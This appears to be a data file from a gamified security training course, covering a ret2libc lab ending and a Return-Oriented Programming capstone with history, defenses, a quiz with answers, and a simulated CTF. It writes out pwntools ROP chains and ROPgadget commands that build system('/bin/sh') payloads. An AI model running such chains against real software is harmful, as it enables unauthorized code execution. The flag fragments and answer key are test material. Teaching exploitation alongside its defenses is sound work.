            "  system = libc.sym['system']; binsh = next(libc.search(b'/bin/sh'))",
            "  payload = b'A'*72 + p64(POP_RDI) + p64(binsh) + p64(system)",
            "  p.sendline(payload)  ->  system('/bin/sh')  ->  # id; uid=1000",
            "  >> NX bypassed using ONLY executable libc code",
            "",
            ">> LEARN: nothing new was injected, so NX never had anything to block",
            ">> BLUE TEAM: ASLR/PIE would force a leak first; memory safety ends it.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 4: ROP capstone ────────────────────────────────────────────────────
  {
    epochId: "range-binex",
    wonder: { name: "The Gadget Chain", location: "Authorized Exploit-Dev Lab", era: "Present Day", emoji: "⛓️" },
    id: "bin-04",
    order: 4,
    title: "ROP: Return-Oriented Programming",
    subtitle: "Build a program out of the program's own fragments",
    category: "cybersecurity",
    xp: 250,
    badge: { id: "badge-bin-rop", name: "ROP Architect", emoji: "⛓️" },
    challengeType: "ctf",
    info: {
      tagline: "When you can't inject code and can't call one libc function cleanly, you stitch the exploit out of tiny existing snippets that each end in 'return' — Turing-complete from the program's own bytes.",
      year: 2007,
      overview: [
        "Return-Oriented Programming, formalized by Hovav Shacham in 2007, is the technique that made non-executable memory largely irrelevant and stands as the capstone of classic binary exploitation. The insight: even with NX preventing any injected code from running, the program and its libraries are full of short instruction sequences that happen to end in a `ret` (return) instruction — call these 'gadgets,' e.g. `pop rdi; ret` or `pop rsi; pop r15; ret`. Because `ret` pops the next address off the stack and jumps to it, an attacker who controls the stack (via the overflow) can lay down a chain of gadget addresses interleaved with data, and the CPU will execute gadget after gadget, each handing off to the next. Stringing the right gadgets together lets you set registers, call functions, and make system calls — Shacham proved ROP is Turing-complete on x86. You're not injecting a program; you're assembling one out of the bytes already in the binary.",
        "In practice a ROP chain is built to do something concrete despite full mitigations: typically set up the registers for an `execve(\"/bin/sh\", 0, 0)` syscall or a `system(\"/bin/sh\")` call, using gadgets found with ROPgadget or pwntools' ROP class (which can auto-build the chain). Against ASLR/PIE you first leak an address (often by ROP-calling `puts` on a known symbol) to deranomize, then send the real chain. This is the synthesis of the whole epoch: reverse engineering to understand the binary (Lab 1), an overflow to control the stack (Lab 2), awareness of which mitigations are present (Lab 3), and gadget-chaining to defeat NX and reach code execution (Lab 4). The defense is correspondingly layered and points to the same conclusion: keep every mitigation on (NX, ASLR/PIE, full RELRO, canaries), add Control-Flow Integrity and hardware backstops (Intel CET shadow stacks / ARM PAC) which specifically break ROP by validating return targets — and, above all, write memory-safe code, because ROP is only reachable through a memory-corruption bug that Rust or Go would never have allowed. The most elegant attack in the offensive Range is, in the end, the strongest argument for memory safety.",
      ],
      technical: {
        title: "Return-Oriented Programming",
        body: [
          "The core idea (code reuse, taken all the way):\n- Even with NX, the binary/libc contain 'gadgets' — short sequences ending in `ret`.\n- ret pops the next stack value into RIP, so a stack you control = a chain of gadgets.\n- Chain gadgets to set registers + call functions/syscalls. ROP is Turing-complete (Shacham '07).",
          "Building a chain in practice:\n- Find gadgets: ROPgadget --binary ./vuln  (pop rdi; ret, syscall, etc.).\n- Goal: set up execve('/bin/sh',0,0) or system('/bin/sh').\n- pwntools ROP() auto-builds: rop.call('system', [binsh]); payload = b'A'*72 + rop.chain().\n- vs ASLR/PIE: ROP-call puts(got_entry) to LEAK an address, recompute, then send the real chain.",
          "The layered defense (and the real answer):\n- Keep NX + ASLR/PIE + full RELRO + canaries ON.\n- Control-Flow Integrity + hardware: Intel CET (shadow stack) / ARM PAC validate return targets -> break ROP.\n- Root fix: memory-safe languages — ROP is only reachable via a memory-corruption bug.",
        ],
        codeExample: {
          label: "Chain gadgets into execve('/bin/sh')",
          code: `$ checksec ./vuln  ->  NX: Yes  PIE: No   # NX defeats injection; ROP doesn't care
$ ROPgadget --binary ./vuln | grep 'pop rdi'
  0x004011ab : pop rdi ; ret

from pwn import *
rop = ROP(ELF('./vuln'))
rop.call('system', [next(libc.search(b'/bin/sh'))])   # auto-chains gadgets
payload = b'A'*72 + rop.chain()
p.sendline(payload)        # CPU executes gadget -> gadget -> system("/bin/sh")

# THE FIX: CET shadow stack / ARM PAC break ROP; memory safety prevents the bug`,
        },
      },
      incident: {
        title: "ROP — Why NX Wasn't Enough",
        when: "Hovav Shacham formalizes ROP, 2007 (building on ret2libc)",
        where: "All modern exploitation of memory-corruption bugs",
        impact: "Made non-executable memory bypassable; drove CFI and hardware mitigations (CET/PAC)",
        body: [
          "Hovav Shacham's 2007 work generalized ret2libc into return-oriented programming and showed that non-executable memory, on its own, does not stop exploitation: an attacker who controls the stack can chain together the short `ret`-terminated gadgets already present in a program to perform arbitrary computation — Turing-complete, without injecting a single new instruction. ROP became the backbone of real-world exploits and the reason NX alone was never sufficient.",
          "It also drove the next generation of defenses aimed squarely at return-address integrity: Control-Flow Integrity, and hardware features like Intel CET's shadow stack and ARM Pointer Authentication, which validate that returns go where they should and break naive ROP chains. This is the capstone of the epoch and its thesis: the offensive Range moved from reading a binary, to controlling its stack, to working around every mitigation — and at the end, the most sophisticated technique is still only reachable through a memory-corruption bug. Keep every mitigation enabled, add CFI/CET/PAC, and write memory-safe code so the door ROP walks through is never opened.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Controlled stack (overflow)", sub: "NX blocks injection", type: "attacker" },
          { label: "Gadgets (…; ret)", sub: "in the binary + libc", type: "system" },
          { label: "Chained gadgets", sub: "set regs → execve('/bin/sh')", type: "victim" },
          { label: "Code exec despite NX", sub: "→ fix: CET/PAC/CFI + memory safety", type: "result" },
        ],
      },
      timeline: [
        { year: 2007, event: "Shacham formalizes ROP — Turing-complete code reuse", highlight: true },
        { year: 2014, event: "CFI research + adoption to constrain control flow" },
        { year: 2020, event: "Intel CET shadow stacks / ARM PAC harden returns in hardware" },
      ],
      keyTakeaways: [
        "ROP chains short 'gadgets' (sequences ending in ret) already in the binary/libc — no injected code",
        "A controlled stack lets ret hand off gadget→gadget; ROP is Turing-complete (defeats NX)",
        "Chains are built to call system()/execve('/bin/sh'); ROPgadget + pwntools' ROP() automate it",
        "Against ASLR/PIE, ROP-leak an address first (e.g. puts), then send the real chain",
        "Defense: keep all mitigations on + CFI and hardware (Intel CET / ARM PAC); memory safety is the root fix",
      ],
      references: [
        { title: "Shacham — The Geometry of Innocent Flesh on the Bone (ROP)", url: "https://hovav.net/ucsd/papers/s07.html" },
        { title: "Intel CET / ARM PAC — return-address protection", url: "https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html" },
      ],
    },
    quiz: {
      questions: [
        { id: "bin-04-q1", type: "Concept", challenge: "What ROP is.", text: "What is a ROP 'gadget'?", options: ["A short existing instruction sequence ending in `ret`", "Injected shellcode", "A cracked password", "A network packet"], correctIndex: 0, explanation: "Gadgets are reused snippets ending in ret." },
        { id: "bin-04-q2", type: "Mechanism", challenge: "Why it chains.", text: "Why does controlling the stack let you chain gadgets?", options: ["`ret` pops the next address off the stack and jumps to it", "ret encrypts memory", "ret disables NX", "ret allocates RAM"], correctIndex: 0, explanation: "ret-driven dispatch chains gadget to gadget." },
        { id: "bin-04-q3", type: "Power", challenge: "Capability.", text: "What did Shacham prove about ROP?", options: ["It's Turing-complete on x86 — arbitrary computation from existing code", "It only crashes programs", "It needs source code", "It requires WPA2"], correctIndex: 0, explanation: "ROP can compute anything, no injection." },
        { id: "bin-04-q4", type: "vs NX", challenge: "Why NX fails.", text: "Why doesn't NX stop ROP?", options: ["ROP reuses already-executable code; nothing new is injected", "NX is always off", "ROP runs on the GPU", "ROP uses the heap only"], correctIndex: 0, explanation: "No injected code means NX has nothing to block." },
        { id: "bin-04-q5", type: "Goal", challenge: "Typical payload.", text: "What does a ROP chain usually set up?", options: ["A call to system()/execve('/bin/sh') by arranging registers", "A password spray", "An ARP spoof", "A DNS tunnel"], correctIndex: 0, explanation: "The goal is usually a shell." },
        { id: "bin-04-q6", type: "Tools", challenge: "Build it.", text: "What automates finding gadgets and building chains?", options: ["ROPgadget and pwntools' ROP() class", "Wireshark", "Hydra", "BloodHound"], correctIndex: 0, explanation: "These tools find gadgets and assemble chains." },
        { id: "bin-04-q7", type: "vs ASLR", challenge: "Add a leak.", text: "How does ROP handle ASLR/PIE?", options: ["Leak an address first (e.g. ROP-call puts), then send the real chain", "Ignore it", "Brute-force all addresses", "Turn off the CPU"], correctIndex: 0, explanation: "A leak deranomizes before the final chain." },
        { id: "bin-04-q8", type: "Defense", challenge: "Stop ROP.", text: "Which defenses specifically target ROP?", options: ["CFI and hardware return protection (Intel CET shadow stack / ARM PAC) — plus memory safety", "A longer password", "Hiding the SSID", "Disabling logging"], correctIndex: 0, explanation: "CET/PAC/CFI validate return targets; memory safety removes the bug." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.40.50", hostname: "kali-pwn", os: "Kali Linux (ROPgadget, pwntools)" },
      targetMachine: bin("NX enabled, no clean one-shot libc call — full exploitation requires a ROP chain"),
      scenario: "The capstone: NX is on and a simple ret2libc isn't clean here. Find gadgets in the binary and chain them into a ROP exploit that calls system(\"/bin/sh\") — assembling a program out of the program's own bytes.",
      hint: "Find gadgets (pop rdi; ret, etc.), then chain them to call system('/bin/sh').",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Find ROP gadgets in the binary. Run: find-gadgets",
        "Chain them into a working exploit. Run: rop-chain",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{R0P_CH41N_", label: "ROP Briefing" },
        { trigger: "find-gadgets", value: "PWN3D_", label: "Gadgets Found" },
        { trigger: "rop-chain", value: "M1T1G4T10NS}", label: "Mitigations Defeated" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — BINEX LAB 4 (CAPSTONE): ROP (NX on, gadget-chain required)",
          "Goal: chain gadgets into system('/bin/sh') despite NX.",
          "Sequence: find-gadgets -> rop-chain -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }, { name: "vuln", isDir: false }] },
      extraCommands: {
        "find-gadgets": (_args: string[]) => ({
          lines: [
            "$ ROPgadget --binary ./vuln | grep -E 'pop rdi|syscall|ret'",
            "  0x004011ab : pop rdi ; ret",
            "  0x004011a9 : pop rsi ; pop r15 ; ret",
            "  0x00401120 : ret              (also useful for stack alignment)",
            "  [+] enough gadgets to set args and call system()",
            "",
            ">> LEARN: the binary's own bytes are your instruction set now",
            ">> BLUE TEAM: Intel CET shadow stack invalidates these returns. Fragment collected.",
          ],
        }),
        "rop-chain": (_args: string[]) => ({
          lines: [
            "from pwn import *",
            "  rop = ROP(ELF('./vuln'))",
            "  rop.call('system', [next(libc.search(b'/bin/sh'))])  # pop rdi; ret -> system",
            "  payload = b'A'*72 + rop.chain()",
            "  p.sendline(payload)",
            "  -> gadget -> gadget -> system('/bin/sh')  ->  $ id; uid=1000(pwn)",
            "  >> shell despite NX — exploit assembled from existing code",
            "",
            ">> LEARN: RE + overflow + mitigation-awareness + gadgets = the full chain",
            ">> BLUE TEAM: CET/PAC + CFI break ROP; memory-safe code prevents the bug entirely.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },
];
